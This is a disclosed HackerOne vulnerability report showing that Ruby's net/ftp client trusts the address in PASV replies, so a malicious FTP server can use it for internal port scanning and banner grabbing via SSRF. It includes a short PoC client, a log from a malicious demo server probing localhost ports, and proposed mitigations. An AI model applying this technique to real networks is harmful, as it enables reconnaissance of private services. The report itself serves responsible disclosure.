# lib/net/ftp.rb: trusting PASV responses allow client abuse

## Report Details
- **Report ID**: 1145454
- **URL**: https://hackerone.com/reports/1145454
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-04-02T15:56:47.192Z
- **Disclosed**: 2021-07-08T15:34:41.703Z

## Reporter
- **Username**: sighook
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
When `net/ftp` performs a passive FTP transfer, it tries to using PASV.  Passive mode is what `net/ftp` uses by default.
A server response to a PASV command includes the (IPv4) address and port number for the client to connect back to in order to perform the actual data
transfer.

This is how the FTP protocol is designed to work.[^1] 

A malicious server can use the PASV response to trick `net/ftp` into connecting back to a given IP address and port, and this way potentially make it extract information about services that are otherwise private and not disclosed, for example doing port scanning and service banner extractions.
If `net/ftp` operates on a URL provided by a user (with by all means is an unwise setup), a user can exploit that and pass in a URL to a malicious FTP server instance without needing any server breach to perform the attack.

Other FTP clients have in the past also had this flaw and have fixed it at different points in time:
* Chrome in 2009: https://github.com/chromium/chromium/commit/a1cea36673186829ab5d1d1408ac50ded3ca5850
* Curl in 2020 (CVE-2020-8284) : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8284
* Firefox in 2007 (CVE-2007-1562): https://bugzilla.mozilla.org/show_bug.cgi?id=370559. In that bugzilla issue there's also a link to paper that describes exactly this and lists a few affected clients (link to archive.org since the original has vanished) https://web.archive.org/web/20070317052623/http://bindshell.net/papers/ftppasv/ftp-client-pasv-manipulation.pdf

[^1]: With one exception: EPSV. The correct behaviour is  first try the EPSV command and if that is not supported,  fall back to using PASV.

## Impact

This behavior is by design (unless `EPSV ALL` is sent) but it could still lead to security issues depending on the context. 
I encountered this issue within a web application with a server-side request forgery (SSRF) issue (but this issue applies to any form of SSRF with `net/ftp` as the request processor). In that context, one can get the following additional capabilities:

* Reliable tcp port scanning (this is not normally possible by just providing a random ip:port to `net/ftp`)
* Network service banner extraction (we setup the data channel on the target ip:port and extract for example an ssh banner: `SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8` without any errors)
* Potential bypass of ip/port restrictions, e.g. the server might be filtering internal IPs or allowing only specific ports (but still allowing FTP)

# PoC

I used the following simple code:
```ruby
require 'net/ftp'
ftp = Net::FTP.new
ftp.connect(ARGV[0], ARGV[1])
ftp.login
#ftp.passive = true # by default
ftp.getbinaryfile('/whatever', 'whatever')
ftp.close
```
And the custom ftp-server:
```
[Parent] Got connection from 192.168.100.2:43520... Spawned process 31749 to handle connection
[PID 31749] SEND: 220 FTP PASV Demo Server v1.0
[PID 31749] RECV: USER anonymous
[PID 31749] SEND: 331 Please specify the password.
[PID 31749] RECV: PASS anonymous@
[PID 31749] SEND: 230 Login successful.
[PID 31749] RECV: TYPE I
[PID 31749] SEND: 200 Switching to Binary mode.
[PID 31749] RECV: PASV
[PID 31750] Handling incoming request to PASV port
>>> Sending 127.0.0.1:8123
[PID 31750] SEND: 227 Entering Passive Mode (127,0,0,1,31,187)
[PID 31750] Exiting
-------------------------------- The Port is Open ---------------------------------
[PID 31749] RECV: RETR /whatever
[PID 31749] SEND: 150 Opening BINARY mode data connection for /whatever (0 bytes).
[PID 31749] SEND: 226 File send OK.
[PID 31749] Exiting
----------------------------------------------------------------------------------
[Parent] Got connection from 192.168.100.2:43524... Spawned process 31787 to handle connection
[PID 31787] SEND: 220 FTP PASV Demo Server v1.0
[PID 31787] RECV: USER anonymous
[PID 31787] SEND: 331 Please specify the password.
[PID 31787] RECV: PASS anonymous@
[PID 31787] SEND: 230 Login successful.
[PID 31787] RECV: TYPE I
[PID 31787] SEND: 200 Switching to Binary mode.
[PID 31787] RECV: PASV
[PID 31788] Handling incoming request to PASV port
>>> 127.0.0.1:8080
[PID 31788] SEND: 227 Entering Passive Mode (127,0,0,1,31,144)
[PID 31788] Exiting
------------------------------- The Port is Closed --------------------------------
[PID 31787] RECV: ERROR: unmatched reply
[PID 31787] Exiting
----------------------------------------------------------------------------------
```

# Mitigation

Currently, `net/ftp` can mitigate this flaw by disabling passive mode, which is enabled by default.  But this is not the best solution to this problem, perhaps, as well as disabling passive mode by default.

For example, firefox just ignores the ip address that is sent from the server. But Curl provides the option which tell to not use the IP address the server suggests in its response to curl's PASV command when curl connects the data connection. Instead curl will re-use the same IP address it already uses for the control connection. The second seems more reasonable.

## Attachments
No attachments
